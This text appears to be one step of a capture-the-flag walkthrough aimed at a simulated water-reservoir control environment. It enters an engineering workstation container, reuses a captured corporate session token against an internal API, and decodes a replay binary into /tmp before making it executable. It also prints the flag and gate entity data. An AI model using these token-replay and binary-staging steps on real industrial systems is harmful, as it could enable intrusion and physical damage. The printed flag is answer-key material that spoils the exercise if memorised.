Requires corporate session (same W21.REVISION prerequisite as W31.1).

## Step 0: Access

```bash
sudo docker exec -it --user fieldlink cinder-arwc-ot-engineering bash
```

Note: W32 uses the OT engineering workstation (`cinder-arwc-ot-engineering`), not the connector. The connector's `/tmp` is `noexec` so the replay binary cannot run from there.

## Step 1: Retrieve the replay binary and structure

```bash
TOKEN=$(cat handover/corporate-session)
curl -s --cacert /tmp/arwc-ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-ARWC-Tenant: arwc" \
  https://process-view.arwc.test/api/replay-sessions/current | python3 -c "
import json,sys,base64
r=json.load(sys.stdin)
print('flag:', r['flag'])
print('record_id:', r['record']['record_id'])
print('entities:', [e['entity'] for e in r['record']['entities']])
print('outlet_example:', r['record']['outlet_example'])
open('/tmp/replay-crr-r19','wb').write(base64.b64decode(r['replay_b64']))
print('binary saved to /tmp/replay-crr-r19')
"
chmod +x /tmp/replay-crr-r19
```

```json
{
  "flag": "FLAG{1d16a3a336e29908}",
  "record": {
    "record_id": "REPLAY-CRR-R19",
    "runtime": "C++20 ECS",
    "trace_binding": "TRACE-R19-DISPUTED",
    "entities": [
      {"entity": "Reservoir", "components": ["Reserve"]},
      {"entity": "OutletGroup", "components": ["Setpoint", "Flow", "Mode"]},
      {"entity": "GateA", "components": ["Position", "Mode"]},
      {"entity": "GateB", "components": ["Position", "Mode"]},
      {"entity": "Buffer", "components": ["Reserve", "Revision"]}
    ],
    "outlet_example": {
      "outlet_group": "OG-CRR-02",
      "entity": "OutletGroup",
      "gates": ["GateA", "GateB"]
    }
  }
}
```

Save binary. Use it in W32.2–W32.4.
